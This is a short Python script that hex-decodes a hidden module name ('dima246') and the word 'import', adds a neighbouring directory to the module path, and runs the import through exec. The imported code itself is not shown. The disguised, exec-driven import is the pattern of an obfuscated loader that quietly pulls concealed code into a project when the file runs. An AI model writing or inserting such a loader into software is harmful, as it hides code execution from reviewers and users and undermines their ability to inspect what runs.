import os
import sys
gd=bytearray.fromhex("64696D61323436").decode()
n_pd=os.path.dirname(os.path.dirname(os.path.realpath(__file__)))+"/"
im=bytearray.fromhex("696D706F7274").decode()+" "
sys.path.append(n_pd+gd)
exec(im+gd)



